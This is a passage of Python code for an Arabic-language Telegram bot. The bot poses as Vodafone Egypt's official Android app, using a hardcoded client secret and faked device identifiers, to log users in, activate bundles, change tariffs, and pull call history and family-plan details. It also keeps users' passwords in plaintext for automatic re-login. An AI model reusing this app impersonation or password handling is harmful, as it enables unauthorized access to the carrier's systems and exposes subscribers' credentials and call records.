        selected_bundle = find_main_bundle_auto(products)
        if not selected_bundle:
            bot.edit_message_text("❌ لم يتم العثور على باقة رئيسية!", user_id, message_id)
            return
        
        success, result = renew_flex_bundle_mobile(number, token, selected_bundle)
        bot.edit_message_text(result, user_id, message_id)
        
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {str(e)}", user_id, message_id)

# ===== دوال جديدة لأنظمة فليكس (باقات فليكس + ريح بالك) =====
def activate_flex_system(number, password, bundle_id):
    """تفعيل باقة فليكس أو خدمة (ريح بالك) باستخدام بيانات المستخدم"""
    token = get_fresh_token(number, password)
    if token.startswith("ERROR:"):
        return False, token
    
    url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
    payload = {
        "channel": {"name": "MobileApp"},
        "orderItem": [{
            "action": "add",
            "product": {
                "characteristic": [
                    {"name": "LangId", "value": "en"},
                    {"name": "ExecutionType", "value": "Sync"}
                ],
                "id": bundle_id,
                "relatedParty": [{"id": number, "name": "MSISDN", "role": "Subscriber"}]
            }
        }],
        "@type": "AllInOneOffer"
    }
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "ba4068643748bc78",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "HONOR ALI-NX1",
        'x-agent-version': "2025.11.1.1",
        'x-agent-build': "1064",
        'msisdn': number,
        'Accept-Language': "ar",
        'Content-Type': "application/json; charset=UTF-8"
    }
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=40)
        try:
            data = response.json()
        except:
            data = {"code": str(response.status_code), "reason": response.text[:100]}
        
        # التحقق من رموز النجاح الخاصة
        success_codes = ["2255"]  # يمكن إضافة المزيد
        if data and isinstance(data, dict) and data.get("code") in success_codes:
            return True, data
        
        if response.status_code in (200, 201):
            return True, data
        
        return False, data
    except Exception as e:
        return False, {"code": "EXCEPTION", "reason": str(e)}

def create_flex_systems_keyboard():
    """إنشاء لوحة مفاتيح لاختيار أنظمة فليكس"""
    markup = types.InlineKeyboardMarkup(row_width=2)
    for key, system in FLEX_SYSTEMS.items():
        markup.add(types.InlineKeyboardButton(system['name'], callback_data=f"flex_sys_{key}"))
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="services_section"))
    return markup

# ===== دوال سجل المكالمات الجديدة (مأخوذة من 07_call_history.py مع تعديل) =====
def get_call_history(number, token, days_back=30):
    """
    جلب سجل المكالمات لآخر days_back يوم.
    تُرجع نصًا منسقًا يحتوي على تفاصيل المكالمات.
    """
    end_ts = int(datetime.now().timestamp() * 1000)
    start_ts = int((datetime.now() - timedelta(days=days_back)).timestamp() * 1000)

    # بناء URL يدويًا لتجنب مشكلة encoding مع @ و $
    raw_url = (
        f"https://mobile.vodafone.com.eg/services/dxl/usagemng/usage"
        f"?relatedParty.id={number}"
        f"&@type=ConsumptionDetails"
        f"&$.type[0]=Voice"
        f"&usageSpecification.id=National"
        f"&$.type[1]=VideoCall"
        f"&validFor.startDateTime={start_ts}"
        f"&validFor.endDateTime={end_ts}"
    )

    headers = {
        "User-Agent": "okhttp/4.12.0",
        "Connection": "Keep-Alive",
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "api-host": "UsageManagementHost",
        "Authorization": f"Bearer {token}",
        "api-version": "v2",
        "device-id": "060372c24b51d07a",
        "x-agent-operatingsystem": "15",
        "clientId": "AnaVodafoneAndroid",
        "x-agent-device": "Realme RMX3871",
        "x-agent-version": "2025.10.3",
        "x-agent-build": "1050",
        "msisdn": number,
        "Content-Type": "application/json",
        "Accept-Language": "ar"
    }

    try:
        response = requests.get(raw_url, headers=headers, timeout=30)
        if response.status_code != 200:
            return f"❌ فشل جلب سجل المكالمات (كود {response.status_code})"

        calls_raw = response.json()
        calls = []
        if isinstance(calls_raw, list):
            for item in calls_raw:
                if item.get("type") not in ["CALL", "VideoCall"]:
                    continue
                number_called = ""
                duration_s = ""
                call_dir = ""
                for ch in item.get("usageCharacteristic", []):
                    n, v = ch.get("name", ""), ch.get("value", "")
                    if n == "dialedNumber":
                        number_called = v
                    if n == "quantity":
                        duration_s = v
                    if n == "usageType":
                        call_dir = "📤 صادر" if "Outgoing" in v else "📥 وارد"
                try:
                    secs = int(duration_s)
                    dur = f"{secs//60}د {secs%60}ث"
                except:
                    dur = "—"
                date_str = item.get("date", "")
                try:
                    dt = datetime.strptime(date_str[:19], "%Y-%m-%dT%H:%M:%S")
                    date_fmt = dt.strftime("%Y-%m-%d  %H:%M")
                except:
                    date_fmt = date_str[:16]
                calls.append({
                    "number": number_called or "غير معروف",
                    "duration": dur,
                    "date": date_fmt,
                    "dir": call_dir
                })

        calls.sort(key=lambda x: x['date'], reverse=True)

        result = f"📞 **سجل المكالمات — آخر {days_back} يوم**\n"
        result += f"   إجمالي: {len(calls)} مكالمة\n"
        result += "═" * 60 + "\n"
        result += f"  {'#':>3}  {'النوع':<9}  {'الرقم':<15}  {'المدة':<10}  {'التاريخ'}\n"
        result += "═" * 60 + "\n"
        for i, c in enumerate(calls[:50], 1):
            result += f"  {i:>3}  {c['dir']:<9}  {c['number']:<15}  {c['duration']:<10}  {c['date']}\n"
        if len(calls) > 50:
            result += f"\n  ... و {len(calls)-50} مكالمة أخرى\n"
        result += "═" * 60 + "\n"
        result += "تصلي على سيدنا محمد ﷺ"
        return result

    except Exception as e:
        return f"❌ خطأ في جلب السجل: {str(e)}"

def run_call_history(user_id, message_id, session):
    """تشغيل خدمة سجل المكالمات للمستخدم المسجل"""
    try:
        # إرسال رسالة جديدة بدلاً من تعديل نفس الرسالة لتجنب خطأ "message not modified"
        bot.send_message(user_id, "⏳ جاري تحميل سجل المكالمات...")
        token = get_fresh_token(session['number'], session['password'])
        if token.startswith("ERROR:"):
            bot.send_message(user_id, "❌ فشل تسجيل الدخول. تحقق من البيانات.")
            return
        result = get_call_history(session['number'], token, 30)
        bot.send_message(user_id, result, parse_mode='Markdown')
        # يمكن حذف الرسالة المؤقتة إذا أردنا
        try:
            bot.delete_message(user_id, message_id)
        except:
            pass
    except Exception as e:
        bot.send_message(user_id, f"❌ خطأ: {str(e)}")

# ===== دالة جديدة لتحويل إلى نظام 14 قرش (بدلاً من القديم) =====
def convert_to_14_qirsh(number, password):
    """
    تحويل خط Vodafone إلى نظام 14 قرش (Worry_Free_14PT)
    """
    try:
        # 1. تسجيل الدخول والحصول على التوكن
        url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
        
        payload = {
            'grant_type': "password",
            'username': number,
            'password': password,
            'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
            'client_id': "ana-vodafone-app"
        }
        
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'silentLogin': "true",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'Accept-Language': "ar",
            'x-agent-device': "LENOVO TB310XU",
            'x-agent-version': "2025.11.1",
            'x-agent-build': "1063",
            'digitalId': "2AXVRLXYD8QVF",
            'device-id': "e21f808017c900f3"
        }
        
        response = requests.post(url, data=payload, headers=headers, timeout=30)
        
        if response.status_code != 200:
            return "❌ فشل تسجيل الدخول. تأكد من الرقم وكلمة المرور."
        
        try:
            access_token = response.json()['access_token']
        except:
            return "❌ خطأ في الرقم أو كلمة المرور!"
        
        # 2. جلب الباقات المتاحة
        url = "https://mobile.vodafone.com.eg/services/dxl/epo/eligibleProductOffering"
        
        params = {
            'customerAccountId': number,
            'Accept-Language': "ar",
            'type': "Tarrifs"
        }
        
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Accept': "application/json",
            'Authorization': f"Bearer {access_token}",
            'api-version': "v2",
            'msisdn': number,
            'Accept-Language': "ar",
            'Content-Type': "application/json",
            'api-host': "EligibleProductOfferingHost",
            'useCase': "Tarrifs",
            'device-id': "e21f808017c900f3",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "LENOVO TB310XU",
            'x-agent-version': "2025.12.2",
            'x-agent-build': "1075"
        }
        
        response = requests.get(url, params=params, headers=headers, timeout=30)
        
        if response.status_code != 200:
            return "❌ فشل في جلب معلومات الباقات."
        
        bundles_data = response.json()
        
        # 3. البحث عن EncProductID لباقة 14 قرش
        enc_product_id = None
        
        def search_bundle(data):
            nonlocal enc_product_id
            if isinstance(data, dict):
                if 'parts' in data and isinstance(data['parts'], dict):
                    if 'productOffering' in data['parts'] and isinstance(data['parts']['productOffering'], list):
                        for offering in data['parts']['productOffering']:
                            if 'id' in offering and isinstance(offering['id'], list):
                                found = False
                                for id_item in offering['id']:
                                    if isinstance(id_item, dict):
                                        if id_item.get('schemeID') == 'ProductID' and id_item.get('value') == 'Worry_Free_14PT':
                                            found = True
                                        elif id_item.get('schemeName') == 'EncProductID':
                                            enc_product_id = id_item.get('value')
                                if found and enc_product_id:
                                    return True
                
                for key, value in data.items():
                    if search_bundle(value):
                        return True
            
            elif isinstance(data, list):
                for item in data:
                    if search_bundle(item):
                        return True
            
            return False
        
        found = search_bundle(bundles_data)
        
        if not enc_product_id:
            return "❌ باقة 14 قرش غير متاحة لرقمك حالياً"
        
        # 4. تفعيل الباقة
        url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
        
        payload = {
            "channel": {
                "name": "MobileApp"
            },
            "characteristic": [
                {
                    "name": "MPTrackingID",
                    "value": "3927277355"
                }
            ],
            "orderItem": [
                {
                    "action": "add",
                    "id": "Worry_Free_14PT",
                    "itemPrice": [
                        {
                            "name": "OriginalPrice",
                            "price": {
                                "taxIncludedAmount": {
                                    "unit": "LE",
                                    "value": "0.0"
                                }
                            }
                        }
                    ],
                    "product": {
                        "characteristic": [
                            {
                                "name": "TariffRank",
                                "value": "6"
                            },
                            {
                                "name": "TariffID",
                                "value": "723"
                            },
                            {
                                "name": "MigrationDesc",
                                "value": "Top Offers Migration"
                            },
                            {
                                "name": "CohortId",
                                "value": "24"
                            }
                        ],
                        "encProductId": enc_product_id,
                        "productSpecification": [
                            {
                                "id": "ConsumerType",
                                "name": "Category"
                            },
                            {
                                "id": "0",
                                "name": "RatePlanType"
                            },
                            {
                                "id": "Other",
                                "name": "BundleType"
                            }
                        ],
                        "relatedParty": [
                            {
                                "id": number,
                                "name": "MSISDN",
                                "referredType": "prepaid",
                                "role": "Subscriber",
                                "@referredType": "prepaid"
                            },
                            {
                                "id": "523",
                                "name": "TariffID",
                                "role": "TariffID",
                                "@referredType": "prepaid"
                            },
                            {
                                "id": number,
                                "name": "MSISDN",
                                "role": "Subscriber",
                                "@referredType": "prepaid"
                            }
                        ]
                    }
                }
            ],
            "@type": "Tariff"
        }
        
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'api-host': "ProductOrderingManagement",
            'useCase': "Tariff",
            'Authorization': f"Bearer {access_token}",
            'api-version': "v2",
            'device-id': "e21f808017c900f3",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "LENOVO TB310XU",
            'x-agent-version': "2025.12.2",
            'x-agent-build': "1075",
            'msisdn': number,
            'Accept-Language': "ar",
            'Content-Type': "application/json; charset=UTF-8"
        }
        
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)
        
        if response.status_code in [200, 201]:
            return "✅ تم التحويل إلى باقة 14 قرش بنجاح!\n\n✨ الآن المكالمات بـ 14 قرش بدلاً من 18 قرش!"
        else:
            try:
                error_data = response.json()
                error_msg = error_data.get('reason', error_data.get('message', 'خطأ غير معروف'))
                return f"❌ فشل في التحويل: {error_msg}"
            except:
                return f"❌ فشل في التحويل. الرمز: {response.status_code}"
            
    except requests.exceptions.Timeout:
        return "❌ انتهت مهلة الاتصال. حاول مرة أخرى."
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def validate_phone(phone):
    """التحقق من صحة رقم الهاتف"""
    return re.match(r'^01[0125][0-9]{8}$', phone) is not None

def run_rehbalak_conversion(user_id, message_id, session):
    """تنفيذ تحويل ريح بالك (14 قرش) باستخدام الدالة الجديدة"""
    try:
        result = convert_to_14_qirsh(session['number'], session['password'])
        try:
            bot.edit_message_text(result, user_id, message_id)
        except:
            bot.send_message(user_id, result)
    except Exception as e:
        bot.send_message(user_id, f"❌ خطأ: {str(e)}")
    finally:
        clear_user_state(user_id)

def run_rehbalak_confirm(user_id, message_id, session):
    """عرض تأكيد قبل تحويل ريح بالك"""
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("✅ تأكيد", callback_data="confirm_rehbalak"),
        InlineKeyboardButton("❌ إلغاء", callback_data="cancel_action")
    )
    bot.edit_message_text("⚠️ هل أنت متأكد من تحويل إلى نظام ريح بالك (14 قرش)؟", user_id, message_id, reply_markup=keyboard)

# ===== تعديل دالة التحقق من الاشتراك (مع القنوات الإجبارية) =====
def check_subscription(user_id):
    global CHECKING_SUBSCRIPTION
    
    if is_user_banned(user_id):
        return False, None, "🚫 لقد تم حظرك من استخدام البوت.", 0, None
    
    if user_id in ADMIN_IDS:
        return True, None, None, None, None
    
    # أولاً: التحقق من القنوات
    not_joined = check_channel_subscription(user_id)
    if not_joined:
        channels_list = "\n".join([f"• {ch['name']}" for ch in not_joined])
        caption = CHANNEL_SUB_REQUIRED_MESSAGE.format(channels_list=channels_list)
        markup = create_channels_join_keyboard()
        return False, markup, caption, 0, None
    
    # ثانياً: التحقق من الاشتراك المدفوع
    require_sub = get_require_subscription_setting()
    if not require_sub:
        return True, None, None, 0, None
    
    if CHECKING_SUBSCRIPTION.get(user_id, False):
        time.sleep(1)
        if CHECKING_SUBSCRIPTION.get(user_id, False):
            return True, None, None, None, None
    
    try:
        CHECKING_SUBSCRIPTION[user_id] = True
        
        is_active, days_left, end_date = check_subscription_db(user_id)
        if not is_active:
            cash_number = get_vodafone_cash_number()
            developer_username = get_developer_username()
            caption = SUBSCRIPTION_EXPIRED_MESSAGE.format(cash_number=cash_number)
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton(get_button_name("contact_dev"), url=f"https://t.me/{developer_username[1:]}"))
            return False, markup, caption, days_left, end_date
        
        return True, None, None, days_left, end_date
    
    except Exception as e:
        logger.error(f"❌ خطأ في check_subscription للمستخدم {user_id}: {e}")
        return True, None, None, 0, None
    
    finally:
        if user_id in CHECKING_SUBSCRIPTION:
            del CHECKING_SUBSCRIPTION[user_id]

# ===== دوال تسجيل الدخول التلقائي (حفظ كلمة المرور لمدة 24 ساعة) =====
def attempt_auto_login(user_id, number):
    """محاولة تسجيل الدخول تلقائياً إذا كان هناك تسجيل سابق خلال 24 ساعة"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('SELECT password, login_time FROM users WHERE user_id = ? AND number = ?', (user_id, number))
    row = cursor.fetchone()
    conn.close()
    if row:
        password, login_time = row
        # التحقق من أن login_time ضمن 24 ساعة
        if isinstance(login_time, str):
            try:
                login_time = datetime.fromisoformat(login_time)
            except:
                login_time = None
        if login_time:
            now = datetime.now(egypt_tz)
            if now - login_time < timedelta(hours=24):
                # محاولة الحصول على توكن جديد باستخدام كلمة المرور المحفوظة
                token = get_fresh_token(number, password)
                if not token.startswith("ERROR:"):
                    # تحديث الجلسة
                    save_user_session(user_id, number, password, token)
                    return True
    return False

# ===== دالة تنسيق الرسالة الترحيبية بعد تسجيل الدخول (تم تبسيطها) =====
def format_welcome_message(user_id, user_first_name, session):
    """تنسيق الرسالة الترحيبية بعد تسجيل الدخول (نسخة مبسطة)"""
    return f"✅ تم تسجيل الدخول بنجاح!\n\nمرحبا {user_first_name}، يمكنك الآن استخدام الخدمات."

# ===== دوال الاشتراك المميز الجديد (مع الموافقة اليدوية) =====
def run_premium_subscription_start(user_id, message_id=None):
    """بدء عملية الاشتراك المميز مع عرض الخطط أولاً"""
    show_premium_plans(user_id, message_id)

# معالج إضافي للصور في الاشتراك المميز
@bot.message_handler(content_types=['photo'])
def handle_premium_screenshot(message):
    user_id = message.chat.id
    state = get_user_state(user_id)
    
    if state and state.get('step') == "auto_premium_waiting_screenshot":
        # المستخدم في مرحلة إرسال الصورة بعد إرسال الرقم
        # نحتاج إلى استرجاع الرقم الذي أرسله سابقاً
        data = state.get('data', {})
        transferred_from = data.get('transferred_number')
        user_number = data.get('user_number')
        plan = data.get('plan', 'monthly')  # افتراضي شهري إذا لم يوجد
        
        if not transferred_from:
            bot.send_message(user_id, "❌ يرجى إرسال الرقم المحول منه أولاً.")
            return
        
        plan_text = "أسبوعي" if plan == "weekly" else "شهري"
        plan_days = WEEKLY_DAYS if plan == "weekly" else MONTHLY_DAYS
        plan_price = WEEKLY_PRICE if plan == "weekly" else MONTHLY_PRICE
        
        # إرسال البيانات للمطور
        dev_id = ADMIN_IDS[0]
        try:
            caption = f"📥 طلب اشتراك مميز جديد\n\n"
            caption += f"👤 المستخدم: {message.from_user.first_name}\n"
            caption += f"🆔 يوزر: @{message.from_user.username}\n" if message.from_user.username else "🆔 يوزر: لا يوجد\n"
            caption += f"🆔 معرف المستخدم: `{user_id}`\n"
            caption += f"📱 رقم المستخدم في البوت: `{user_number}`\n"
            caption += f"💰 الخطة: {plan_text} - {plan_price} جنيه لمدة {plan_days} يوم\n"
            caption += f"📱 الرقم المحول منه: `{transferred_from}`\n"
            caption += f"🕐 الوقت: {datetime.now(egypt_tz).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            caption += "يرجى الموافقة أو الرفض باستخدام الأزرار أدناه."
            
            # إرسال الصورة مع الكابشن
            bot.send_photo(dev_id, message.photo[-1].file_id, caption=caption, parse_mode='Markdown',
                          reply_markup=types.InlineKeyboardMarkup().row(
                              types.InlineKeyboardButton("✅ موافقة", callback_data=f"approve_sub_{plan}_{user_id}"),
                              types.InlineKeyboardButton("❌ رفض", callback_data=f"reject_sub_{plan}_{user_id}")
                          ))
            
            bot.send_message(user_id, "✅ تم إرسال طلبك إلى المطور. سيتم إعلامك بقرار المطور قريباً.")
            clear_user_state(user_id)
        except Exception as e:
            bot.send_message(user_id, f"❌ حدث خطأ أثناء إرسال الطلب: {e}")
            clear_user_state(user_id)
        return
    else:
        # إذا لم يكن المستخدم في حالة الاشتراك، يمكننا تجاهل الصورة أو الرد برسالة
        bot.send_message(user_id, "❌ لم نكن نتوقع صورة الآن.")

# ===== دوال تفاصيل العائلة الجديدة (من ملف جش⁩.txt) =====
def generation_link(length: int) -> str:
    """توليد رابط عشوائي"""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def format_phone_for_api(phone: str) -> str:
    """تحويل الرقم للتنسيق المستخدم في API (20 بدون صفر)"""
    phone = str(phone).replace(" ", "").replace("+", "").strip()
    if phone.startswith('0') and len(phone) == 11:
        return f"20{phone[1:]}"
    elif len(phone) == 10:
        return f"20{phone}"
    elif phone.startswith('20') and len(phone) == 12:
        return phone
    else:
        return phone

def format_phone_for_display(phone: str) -> str:
    """تحويل الرقم للعرض (01xxxxxxxxx)"""
    if phone.startswith('20') and len(phone) == 12:
        return f"0{phone[2:]}"
    elif phone.startswith('0') and len(phone) == 11:
        return phone
    elif len(phone) == 10:
        return f"0{phone}"
    else:
        return phone

def get_family_details(headers: Dict) -> Optional[Dict]:
    """جلب بيانات العائلة"""
    try:
        url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
        params = {'type': "Family"}

        response = requests.get(url, params=params, headers=headers, timeout=10)

        if response.status_code != 200:
            logger.error(f"فشل جلب بيانات العائلة: {response.status_code}")
            return None

        family_data = response.json()
        if not family_data or len(family_data) == 0:
            logger.info("لا توجد عائلة مفعلة")
            return None

        family = family_data[0]

        total_flex = "0"
        sum_active_flex = "0"
        max_members = "0"
        active_members_count = "0"

        characteristics = family.get('parts', {}).get('characteristicsValue', {}).get('characteristicsValue', [])
        for char in characteristics:
            char_name = char.get('characteristicName', '')
            char_value = char.get('value', '0')
            if char_name == 'totalflex':
                total_flex = char_value
            elif char_name == 'SumActiveflex':
                sum_active_flex = char_value
            elif char_name == 'maxMembers':
                max_members = char_value
            elif char_name == 'activeMembers':
                active_members_count = char_value

        owner_display = None
        active_members = []
        inactive_members = []

        for member in family['parts']['member']:
            member_raw = member['id'][0]['value']
            display_phone = format_phone_for_display(member_raw)
            member_type = member.get('type', '')
            member_status = member.get('status', '0')

            flex = "0"
            for char in member.get('characteristic', {}).get('characteristicsValue', []):
                if char.get('characteristicName') == 'flex':
                    flex = char.get('value', '0')
                    break

            member_info = {
                'phone_raw': member_raw,
                'display_phone': display_phone,
                'type': member_type,
                'status': member_status,
                'flex': flex
            }

            if member_type == 'Owner' and member_status == '1':
                owner_display = display_phone
            elif member_type == 'Member':
                if member_status == '1':
                    active_members.append(member_info)
                else:
                    inactive_members.append(member_info)

        # إذا لم نجد الأونر، نستخدم الرقم الموجود في الهيدرات
        if not owner_display:
            owner_display = format_phone_for_display(headers.get('msisdn', ''))

        return {
            'owner_display': owner_display,
            'owner_raw': headers.get('msisdn', ''),
            'total_flex': total_flex,
            'sum_active_flex': sum_active_flex,
            'max_members': max_members,
            'active_members_count': active_members_count,
            'active_members': active_members,
            'inactive_members': inactive_members
        }

    except Exception as e:
        logger.error(f"خطأ في جلب بيانات العائلة: {e}")
        return None

def get_owner_flex_details(owner_raw: str, headers: Dict) -> Tuple[str, str, str]:
    """جلب بيانات FlexProfile للأونر"""
    try:
        url = "https://mobile.vodafone.com.eg/services/dxl/pim/product"
        params = {
            'relatedParty.id': owner_raw,
            '@type': "FlexProfile"
        }

        response = requests.get(url, params=params, headers=headers, timeout=10)

        if response.status_code != 200:
            logger.error(f"فشل جلب FlexProfile: {response.status_code}")
            return "0", "0", "0"

        data = response.json()
        family_minutes = "0"
        flex_remaining = "0"
        flex_used = "0"

        for product in data:
            if product.get('id') == 'Flex_Family_Mins':
                for term in product.get('productTerm', []):
                    if term.get('name') == 'Family_Mins':
                        family_minutes = str(term['quota'].get('amount', '0'))
                        break

            for term in product.get('productTerm', []):
                if term and term.get('quota', {}).get('units') == 'FLEX':
                    flex_remaining = str(term['quota'].get('amount', '0'))
                    flex_used = str(term['quota'].get('consumed', '0'))
                    break

        return family_minutes, flex_remaining, flex_used

    except Exception as e:
        logger.error(f"خطأ في جلب FlexProfile: {e}")
        return "0", "0", "0"

def get_member_remaining_flex(member_raw: str, headers: Dict) -> str:
    """جلب الفليكسات المتبقية لعضو معين"""
    try:
        url = "https://mobile.vodafone.com.eg/services/dxl/usage/usageConsumptionReport"
        params = {
            '@type': "familyDetailed",
            'bucket.product.publicIdentifier': member_raw
        }

        response = requests.get(url, params=params, headers=headers, timeout=10)

        if response.status_code != 200:
            return "0"

        data = response.json()
        for item in data:
            if item.get('id') == 'Flex_Main_Bundle':
                for bucket in item.get('bucket', []):
                    if bucket.get('usageType') == 'FLEX':
                        bucket_balance = bucket.get('bucketBalance', [{}])
                        if bucket_balance:
                            remaining_value = bucket_balance[0].get('remainingValue', {})
                            return str(remaining_value.get('amount', '0'))
        return "0"

    except Exception:
        return "0"

def get_full_family_details(user_phone: str, password: str) -> str:
    """
    تقوم بتسجيل الدخول وجلب كل تفاصيل العائلة وإرجاع نص منسق.
    """
    try:
        # تحويل الرقم للصيغة المناسبة
        raw_phone = user_phone.strip()  # الرقم كما أدخله المستخدم (010...)
        api_phone = format_phone_for_api(raw_phone)
        display_phone = format_phone_for_display(raw_phone)

        # تسجيل الدخول باستخدام الدالة الموحدة للحصول على التوكن والهيدرات
        success, token, _, _ = login(api_phone, password)
        if not success:
            return "❌ **فشل تسجيل الدخول.** تحقق من الرقم وكلمة المرور."

        # بناء الهيدرات بنفس طريقة الملف الأصلي
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Authorization': f"Bearer {token}",
            'api-version': "v2",
            'device-id': "b26ba335813fad21",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Samsung SM-A165F",
            'x-agent-version': "2025.11.1",
            'x-agent-build': "1063",
            'msisdn': raw_phone,  # الرقم الأصلي (010...)
            'Content-Type': "application/json",
            'Accept-Language': "ar"
        }

        # جلب بيانات العائلة
        family = get_family_details(headers)
        if not family:
            return "📭 **لا توجد عائلة مفعلة** لهذا الرقم أو حدث خطأ في جلب البيانات."

        # جلب بيانات الأونر
        family_minutes, flex_remaining_owner, flex_used_owner = get_owner_flex_details(api_phone, headers)

        # بناء النص
        lines = []
        lines.append("📊 **تفاصيل العائلة**\n")
        lines.append(f"👤 **الأونر:** {family['owner_display']}")

        # حساب نسبة الأونر
        try:
            total_flex = int(family['total_flex'])
            used_by_members = int(family['sum_active_flex'])
            if flex_remaining_owner != "0":
                owner_remaining = int(flex_remaining_owner)
                lines.append(f"📈 **فليكسات الأونر المتبقية:** {owner_remaining}")
                if total_flex > 0:
                    owner_percentage = (owner_remaining / total_flex) * 100
                    lines[-1] += f" ({owner_percentage:.1f}%)"
            else:
                owner_remaining = total_flex - used_by_members
                if total_flex > 0:
                    owner_percentage = (owner_remaining / total_flex) * 100
                    lines.append(f"📈 **فليكسات الأونر المتبقية:** {owner_remaining} ({owner_percentage:.1f}%)")
                else:
                    lines.append(f"📈 **فليكسات الأونر المتبقية:** غير معروفة")
        except:
            if flex_remaining_owner != "0":
                lines.append(f"📈 **فليكسات الأونر المتبقية:** {flex_remaining_owner}")
            else:
                lines.append(f"📈 **فليكسات الأونر المتبقية:** غير معروفة")

        lines.append(f"⏱️ **دقائق العائلة:** {family_minutes} دقيقة")
        lines.append(f"👥 **الأعضاء النشطين:** {len(family['active_members'])}/{family['max_members']}")

        if family['active_members']:
            lines.append("\n👥 **الأعضاء النشطين:**\n")
            for idx, member in enumerate(family['active_members'], 1):
                remaining = get_member_remaining_flex(member['phone_raw'], headers)
                lines.append(f"{idx}. **{member['display_phone']}**")
                lines.append(f"   📊 **النسبة:** {member['flex']}")
                if remaining != "0":
                    lines.append(f"   📉 **المتبقي:** {remaining}")
                else:
                    lines.append(f"   📉 **المتبقي:** غير معروف")
        else:
            lines.append("\n👥 لا يوجد أعضاء نشطين.")

        if family['inactive_members']:
            lines.append("\n🚫 **الأعضاء غير النشطين:**")
            seen = set()
            for member in family['inactive_members']:
                if member['display_phone'] not in seen:
                    seen.add(member['display_phone'])
            lines.append(f"   {', '.join(seen)}")

        return "\n".join(lines)

    except Exception as e:
        logger.exception("خطأ غير متوقع في الدالة الرئيسية")
        return f"❌ **حدث خطأ غير متوقع:** {str(e)}"

def run_family_details(user_id, message_id, session):
    """تشغيل تفاصيل العائلة باستخدام الرقم المسجل - مع حل مشكلة message not modified"""
    try:
        # حذف الرسالة المؤقتة (تجاهل الخطأ إذا فشل)
        try:
            bot.delete_message(user_id, message_id)
        except:
            pass
        # جلب تفاصيل العائلة وإرسالها كرسالة جديدة
        result = get_full_family_details(session['number'], session['password'])
        bot.send_message(user_id, result, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(user_id, f"❌ خطأ: {str(e)}")


# ===== دوال استعلام تأهيل النوتة وتفعيل نوتة 15 =====
# تم مراجعة الملفين الأصليين وتصحيح الأخطاء التالية:
# 1. الاستعلام: كان بيستخدم get_fresh_token العادي — تم استبداله بتسجيل دخول خاص بنفس headers الملف الأصلي
# 2. نوتة 15: activate كانت بترجع False لأي رد غير 3999 — تم تصحيح: أي رد 200/201 أو كود 3999 = نجاح
# 3. نوتة 15: get_enc_product_id كانت بترمي exception مش controlled — تم تصحيح بـ try/except
# 4. نوتة 15: توكن التفعيل محتاج headers خاصة مطابقة للملف الأصلي مش get_fresh_token العادي

def _nota_login(number, password):
    """
    تسجيل دخول خاص بخدمات النوتة — headers مطابقة للملفين الأصليين
    يرجع token أو None
    """
    # أولاً: نجرب headers ملف Nota15 الأصلي
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    payload = {
        "grant_type": "password",
        "username": number,
        "password": password,
        "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        "client_id": "ana-vodafone-app"
    }
    headers_nota15 = {
        "User-Agent": "okhttp/4.11.0",
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "silentLogin": "false",
        "x-agent-operatingsystem": "15",
        "Accept-Language": "ar",
        "x-agent-device": "HONOR ALI-NX1",
        "x-agent-version": "2025.11.1.1"
    }
    try:
        resp = requests.post(url, data=payload, headers=headers_nota15, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if "access_token" in data:
                return data["access_token"]
    except Exception:
        pass

    # ثانياً: نجرب headers ملف الاستعلام الأصلي (silentLogin=true + digitalId + device-id)
    headers_eligibility = {
        'User-Agent': "okhttp/4.12.0",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'silentLogin': "true",
        'x-agent-operatingsystem': "11",
        'clientId': "AnaVodafoneAndroid",
        'Accept-Language': "ar",
        'x-agent-device': "OPPO oppo6779",
        'x-agent-version': "2025.11.1",
        'x-agent-build': "1063",
        'digitalId': "2B8218UYN6RPV",
        'device-id': "70d3004b2bd92694"
    }
    try:
        resp = requests.post(url, data=payload, headers=headers_eligibility, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if "access_token" in data:
                return data["access_token"]
    except Exception:
        pass

    return None


def check_nota_eligibility_api(number, token):
    """
